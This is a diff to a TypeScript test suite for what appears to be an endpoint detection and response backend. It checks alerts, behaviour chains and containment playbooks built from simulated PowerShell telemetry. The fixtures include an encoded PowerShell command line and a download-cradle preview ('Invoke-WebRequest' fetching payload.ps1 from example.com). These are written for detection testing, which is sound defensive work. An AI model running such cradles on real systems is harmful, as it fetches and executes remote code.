@@ -682,7 +682,26 @@ test("telemetry ingestion generates alerts and dedupes repeat detections", async
           source: "process-delta",
           summary: "Process powershell.exe started with PID 4412 and parent PID 920.",
           occurredAt: "2026-04-08T09:01:10Z",
-          payloadJson: "{\"pid\":4412,\"parentPid\":920,\"imageName\":\"powershell.exe\"}"
+          payloadJson:
+            "{\"pid\":4412,\"parentPid\":920,\"imageName\":\"powershell.exe\",\"imagePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"parentImageName\":\"explorer.exe\",\"parentImagePath\":\"C:\\\\Windows\\\\explorer.exe\",\"commandLine\":\"powershell.exe -NoProfile -EncodedCommand SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAg\",\"userSid\":\"S-1-5-21-1000\",\"integrityLevel\":\"medium\",\"sessionId\":\"1\",\"signer\":\"Microsoft Windows\"}"
+        },
+        {
+          eventId: "evt-detect-004",
+          eventType: "image.loaded",
+          source: "process-delta",
+          summary: "Image kernel32.dll loaded into powershell.exe (PID 4412).",
+          occurredAt: "2026-04-08T09:01:11Z",
+          payloadJson:
+            "{\"pid\":4412,\"imageName\":\"kernel32.dll\",\"imagePath\":\"C:\\\\Windows\\\\System32\\\\kernel32.dll\",\"processImageName\":\"powershell.exe\",\"processImagePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"sessionId\":\"1\",\"signer\":\"Microsoft Windows\",\"imageBase\":\"0x7ffb01000000\",\"imageSize\":\"0x1f000\"}"
+        },
+        {
+          eventId: "evt-detect-005",
+          eventType: "network.connection.snapshot",
+          source: "network-wfp",
+          summary: "Observed tcp4 connection for powershell.exe from 10.252.0.70:51324 to 203.0.113.50:443 (established).",
+          occurredAt: "2026-04-08T09:01:12Z",
+          payloadJson:
+            "{\"pid\":4412,\"protocol\":\"tcp4\",\"state\":\"established\",\"localAddress\":\"10.252.0.70\",\"localPort\":51324,\"remoteAddress\":\"203.0.113.50\",\"remotePort\":443,\"processImageName\":\"powershell.exe\",\"processImagePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}"
         },
         {
           eventId: "evt-detect-002",
@@ -698,7 +717,7 @@ test("telemetry ingestion generates alerts and dedupes repeat detections", async
   });
 
   assert.equal(firstIngestResponse.statusCode, 200);
-  assert.equal(firstIngestResponse.json().accepted, 2);
+  assert.equal(firstIngestResponse.json().accepted, 4);
 
   const firstAlertsResponse = await harness.app.inject({
     method: "GET",
@@ -708,9 +727,11 @@ test("telemetry ingestion generates alerts and dedupes repeat detections", async
   assert.equal(firstAlertsResponse.statusCode, 200);
   const firstAlertsPayload = firstAlertsResponse.json() as {
     items: Array<{
+      id: string;
       hostname: string;
       title: string;
       severity: string;
+      tacticId?: string;
       technique?: string;
       detectedAt: string;
       fingerprint?: string;
@@ -725,8 +746,127 @@ test("telemetry ingestion generates alerts and dedupes repeat detections", async
   );
   assert.ok(powerShellAlert);
   assert.equal(powerShellAlert.severity, "high");
+  assert.equal(powerShellAlert.tacticId, "TA0002");
   assert.equal(powerShellAlert.technique, "T1059.001");
   assert.match(powerShellAlert.summary, /post-exploitation behavior/i);
+
+  const powerShellDetailResponse = await harness.app.inject({
+    method: "GET",
+    url: `/api/v1/alerts/${powerShellAlert.id}`
+  });
+
+  assert.equal(powerShellDetailResponse.statusCode, 200);
+  const powerShellDetail = powerShellDetailResponse.json() as {
+    alert: { id: string; tacticId?: string };
+    device: { id: string } | null;
+    playbook: {
+      mode: string;
+      title: string;
+      summary: string;
+      evidenceToPreserve: string[];
+      actions: Array<{
+        id: string;
+        category: string;
+        title: string;
+        detail: string;
+        reason: string;
+        commandType?: string;
+        targetPath?: string;
+        automationEligible: boolean;
+        approvalRequired: boolean;
+      }>;
+    };
+    behaviorChain: {
+      score: number;
+      narrative: string;
+      whatHappened: string;
+      whySuspicious: string;
+      blocked: string;
+      atRisk: string;
+      tacticIds: string[];
+      techniqueIds: string[];
+      steps: Array<{
+        id: string;
+        category: string;
+        title: string;
+        summary: string;
+        source: string;
+        blocked?: boolean;
+        atRisk?: string;
+        tacticId?: string;
+        techniqueId?: string;
+      }>;
+    };
+    matchingTelemetry: Array<{
+      eventId: string;
+      processId?: number;
+      parentProcessId?: number;
+      processImageName?: string;
+      processImagePath?: string;
+      parentProcessImageName?: string;
+      parentProcessImagePath?: string;
+      processCommandLine?: string;
+      processUserSid?: string;
+      processIntegrityLevel?: string;
+      processSessionId?: string;
+      processSigner?: string;
+      processExitCode?: number;
+      moduleImageName?: string;
+      moduleImagePath?: string;
+      moduleImageBase?: string;
+      moduleImageSize?: string;
+    }>;
+    relatedAlerts: Array<{ title: string }>;
+    evidence: Array<{ recordId: string }>;
+    quarantineItems: Array<{ recordId: string }>;
+  };
+  assert.equal(powerShellDetail.alert.id, powerShellAlert.id);
+  assert.equal(powerShellDetail.device?.id, deviceId);
+  assert.equal(powerShellDetail.playbook.mode, "containment");
+  assert.ok(powerShellDetail.playbook.actions.some((action) => action.commandType === "device.isolate"));
+  assert.ok(powerShellDetail.playbook.actions.some((action) => action.commandType === "process.tree.terminate"));
+  assert.ok(powerShellDetail.playbook.evidenceToPreserve.some((item) => /process lineage/i.test(item)));
+  assert.ok(powerShellDetail.behaviorChain.score >= 70);
+  assert.equal(powerShellDetail.behaviorChain.tacticIds.includes("TA0002"), true);
+  assert.equal(powerShellDetail.behaviorChain.tacticIds.includes("TA0011"), true);
+  assert.equal(powerShellDetail.behaviorChain.steps.some((step) => step.category === "process"), true);
+  assert.equal(powerShellDetail.behaviorChain.steps.some((step) => step.category === "module"), true);
+  assert.equal(powerShellDetail.behaviorChain.steps.some((step) => step.category === "network" && step.tacticId === "TA0011"), true);
+  assert.match(powerShellDetail.behaviorChain.whatHappened, /powershell\.exe/i);
+  assert.match(powerShellDetail.behaviorChain.whySuspicious, /encoded|network|loader/i);
+  assert.ok(powerShellDetail.matchingTelemetry.some((item) => item.eventId === "evt-detect-001"));
+  assert.equal(powerShellDetail.matchingTelemetry[0].processImageName, "powershell.exe");
+  assert.equal(powerShellDetail.matchingTelemetry[0].parentProcessImageName, "explorer.exe");
+  assert.match(powerShellDetail.matchingTelemetry[0].processCommandLine ?? "", /EncodedCommand/i);
+  assert.equal(powerShellDetail.matchingTelemetry[0].processIntegrityLevel, "medium");
+  assert.equal(powerShellDetail.matchingTelemetry[0].processSigner, "Microsoft Windows");
+  assert.ok(powerShellDetail.relatedAlerts.some((item) => item.title === "Executable dropped in monitored folder"));
+  assert.equal(powerShellDetail.evidence.length, 0);
+  assert.equal(powerShellDetail.quarantineItems.length, 0);
+
+  const deviceDetailResponse = await harness.app.inject({
+    method: "GET",
+    url: `/api/v1/devices/${deviceId}`
+  });
+
+  assert.equal(deviceDetailResponse.statusCode, 200);
+  const deviceDetail = deviceDetailResponse.json() as {
+    telemetry: Array<{
+      eventId: string;
+      processImageName?: string;
+      processCommandLine?: string;
+      processSigner?: string;
+      moduleImageName?: string;
+      processImagePath?: string;
+      moduleImagePath?: string;
+    }>;
+  };
+  assert.ok(deviceDetail.telemetry.some((item) => item.eventId === "evt-detect-001" && item.processImageName === "powershell.exe"));
+  assert.ok(
+    deviceDetail.telemetry.some(
+      (item) => item.eventId === "evt-detect-004" && item.moduleImageName === "kernel32.dll" && item.processImageName === "powershell.exe"
+    )
+  );
 
   const fileDropAlert = firstAlertsPayload.items.find(
     (alert) => alert.hostname === "LAB-ENDPOINT-03" && alert.title === "Executable dropped in monitored folder"
@@ -843,9 +983,11 @@ test("scan findings generate alerts with quarantine context", async (t) => {
   assert.equal(alertsResponse.statusCode, 200);
   const alertsPayload = alertsResponse.json() as {
     items: Array<{
+      id: string;
       hostname: string;
       title: string;
       severity: string;
+      tacticId?: string;
       technique?: string;
       fingerprint?: string;
       summary: string;
@@ -858,9 +1000,216 @@ test("scan findings generate alerts with quarantine context", async (t) => {
   assert.ok(scanAlert);
   assert.equal(scanAlert.severity, "high");
   assert.equal(scanAlert.technique, "T1204.002");
+
+  const scanDetailResponse = await harness.app.inject({
+    method: "GET",
+    url: `/api/v1/alerts/${scanAlert.id}`
+  });
+
+  assert.equal(scanDetailResponse.statusCode, 200);
+  const scanDetail = scanDetailResponse.json() as {
+    alert: { id: string };
+    device: { id: string } | null;
+    matchingTelemetry: Array<{ eventId: string }>;
+    evidence: Array<{ recordId: string }>;
+    quarantineItems: Array<{ recordId: string }>;
+    scanHistory: Array<{ eventId: string }>;
+  };
+  assert.equal(scanDetail.alert.id, scanAlert.id);
+  assert.equal(scanDetail.device?.id, deviceId);
+  assert.ok(scanDetail.matchingTelemetry.some((item) => item.eventId === "evt-scan-001"));
+  assert.ok(scanDetail.evidence.some((item) => item.recordId === "ev-001"));
+  assert.ok(scanDetail.quarantineItems.some((item) => item.recordId === "qr-001"));
+  assert.ok(scanDetail.scanHistory.some((item) => item.eventId === "evt-scan-001"));
+
+  const missingAlertResponse = await harness.app.inject({
+    method: "GET",
+    url: "/api/v1/alerts/missing-alert"
+  });
+
+  assert.equal(missingAlertResponse.statusCode, 404);
+  assert.equal(missingAlertResponse.json().error, "alert_not_found");
   assert.equal(scanAlert.fingerprint, `scan:${deviceId}:${sha256}`);
   assert.match(scanAlert.summary, /SHA-256/i);
   assert.match(scanAlert.summary, /Local quarantine completed successfully/i);
+});
+
+test("AMSI scan findings retain script context in alert and device detail", async (t) => {
+  const harness = await createTestApp();
+  t.after(async () => {
+    await harness.cleanup();
+  });
+
+  const enrollResponse = await harness.app.inject({
+    method: "POST",
+    url: "/api/v1/enroll",
+    payload: {
+      hostname: "LAB-ENDPOINT-04-AMSI",
+      osVersion: "Windows 11 24H2",
+      serialNumber: "LAB-0004-AMSI"
+    }
+  });
+
+  assert.equal(enrollResponse.statusCode, 201);
+  const enrollment = enrollResponse.json() as { deviceId: string; deviceApiKey?: string };
+  const { deviceId } = enrollment;
+
+  const preview = "Write-Host hello; Invoke-WebRequest https://example.com/payload.ps1";
+  const ingestResponse = await harness.app.inject({
+    method: "POST",
+    url: `/api/v1/devices/${deviceId}/telemetry`,
+    headers: deviceAuthHeaders(enrollment),
+    payload: {
+      events: [
+        {
+          eventId: "evt-amsi-001",
+          eventType: "scan.finding",
+          source: "amsi-provider",
+          summary: "AMSI provider blocked PowerShell content after detecting a suspicious download cradle.",
+          occurredAt: "2026-04-08T09:11:00Z",
+          payloadJson:
+            "{\"path\":\"memory://PowerShell/42\",\"sizeBytes\":1536,\"sha256\":\"2222222222222222222222222222222222222222222222222222222222222222\",\"disposition\":\"block\",\"remediationStatus\":\"none\",\"tacticId\":\"TA0002\",\"techniqueId\":\"T1059.001\",\"evidenceRecordId\":\"ev-amsi-001\",\"appName\":\"PowerShell\",\"contentName\":\"C:\\\\Users\\\\lab\\\\Downloads\\\\launch.ps1\",\"source\":\"stream\",\"sessionId\":42,\"preview\":\"" +
+            preview +
+            "\"}"
+        }
+      ]
+    }
+  });
+
+  assert.equal(ingestResponse.statusCode, 200);
+  assert.equal(ingestResponse.json().accepted, 1);
+
+  const alertsResponse = await harness.app.inject({
+    method: "GET",
+    url: "/api/v1/alerts"
+  });
+
+  assert.equal(alertsResponse.statusCode, 200);
+  const alertsPayload = alertsResponse.json() as {
+    items: Array<{
+      id: string;
+      hostname: string;
+      title: string;
+      severity: string;
+      tacticId?: string;
+      technique?: string;
+      fingerprint?: string;
+      summary: string;
+    }>;
+  };
+
+  const scanAlert = alertsPayload.items.find(
+    (alert) => alert.hostname === "LAB-ENDPOINT-04-AMSI" && alert.title === "Suspicious PowerShell content blocked after AMSI inspection"
+  );
+  assert.ok(scanAlert);
+  assert.equal(scanAlert?.severity, "high");
+  assert.equal(scanAlert.tacticId, "TA0002");
+  assert.equal(scanAlert?.technique, "T1059.001");
+  assert.match(scanAlert?.summary ?? "", /AMSI app: PowerShell/i);
+  assert.match(scanAlert?.summary ?? "", /Source type: stream/i);
+  assert.match(scanAlert?.summary ?? "", /Preview: Write-Host hello/i);
+
+  const deviceDetailResponse = await harness.app.inject({
+    method: "GET",
+    url: `/api/v1/devices/${deviceId}`
+  });
+
+  assert.equal(deviceDetailResponse.statusCode, 200);
+  const deviceDetail = deviceDetailResponse.json() as {
+    evidence: Array<{
+      recordId: string;
+      subjectPath: string;
+      appName?: string;
+      contentName?: string;
+      sourceType?: string;
+      sessionId?: number;
+      preview?: string;
+    }>;
+    scanHistory: Array<{
+      eventId: string;
+      subjectPath: string;
+      appName?: string;
+      contentName?: string;
+      sourceType?: string;
+      sessionId?: number;
+      preview?: string;
+    }>;
+  };
+
+  assert.equal(deviceDetail.evidence.length, 1);
+  assert.equal(deviceDetail.evidence[0].appName, "PowerShell");
+  assert.equal(deviceDetail.evidence[0].contentName, "C:\\Users\\lab\\Downloads\\launch.ps1");
+  assert.equal(deviceDetail.evidence[0].sourceType, "stream");
+  assert.equal(deviceDetail.evidence[0].sessionId, 42);
+  assert.match(deviceDetail.evidence[0].preview ?? "", /Write-Host hello/i);
+
+  assert.equal(deviceDetail.scanHistory.length, 1);
+  assert.equal(deviceDetail.scanHistory[0].appName, "PowerShell");
+  assert.equal(deviceDetail.scanHistory[0].contentName, "C:\\Users\\lab\\Downloads\\launch.ps1");
+  assert.equal(deviceDetail.scanHistory[0].sourceType, "stream");
+  assert.equal(deviceDetail.scanHistory[0].sessionId, 42);
+  assert.match(deviceDetail.scanHistory[0].preview ?? "", /Invoke-WebRequest/i);
+
+  const alertDetailResponse = await harness.app.inject({
+    method: "GET",
+    url: `/api/v1/alerts/${scanAlert?.id}`
+  });
+
+  assert.equal(alertDetailResponse.statusCode, 200);
+  const alertDetail = alertDetailResponse.json() as {
+    evidence: Array<{
+      appName?: string;
+      contentName?: string;
+      sourceType?: string;
+      sessionId?: number;
+      preview?: string;
+    }>;
+    playbook: {
+      mode: string;
+      title: string;
+      summary: string;
+      evidenceToPreserve: string[];
+      actions: Array<{
+        id: string;
+        category: string;
+        title: string;
+        detail: string;
+        reason: string;
+        commandType?: string;
+        targetPath?: string;
+        automationEligible: boolean;
+        approvalRequired: boolean;
+      }>;
+    };
+    scanHistory: Array<{
+      appName?: string;
+      contentName?: string;
+      sourceType?: string;
+      sessionId?: number;
+      preview?: string;
+    }>;
+    behaviorChain: {
+      score: number;
+      tacticIds: string[];
+      steps: Array<{ category: string; blocked?: boolean; tacticId?: string; techniqueId?: string }>;
+    };
+  };
+
+  assert.ok(alertDetail.behaviorChain.score >= 60);
+  assert.equal(alertDetail.behaviorChain.steps.some((step) => step.category === "script" && step.blocked), true);
+  assert.equal(alertDetail.behaviorChain.tacticIds.includes("TA0002"), true);
+  assert.equal(alertDetail.playbook.mode, "cleanup");
+  assert.ok(alertDetail.playbook.actions.some((action) => action.commandType === "scan.targeted"));
+  assert.ok(alertDetail.playbook.actions.some((action) => action.commandType === "persistence.cleanup"));
+  assert.equal(
+    alertDetail.playbook.actions.find((action) => action.commandType === "scan.targeted")?.targetPath,
+    "C:\\Users\\lab\\Downloads\\launch.ps1"
+  );
+  assert.equal(alertDetail.evidence[0].contentName, "C:\\Users\\lab\\Downloads\\launch.ps1");
+  assert.equal(alertDetail.evidence[0].sourceType, "stream");
+  assert.equal(alertDetail.scanHistory[0].appName, "PowerShell");
+  assert.equal(alertDetail.scanHistory[0].sessionId, 42);
+  assert.match(alertDetail.scanHistory[0].preview ?? "", /Write-Host hello/i);
 });
 
 test("device commands can be queued, polled, completed, and quarantine inventory updates", async (t) => {
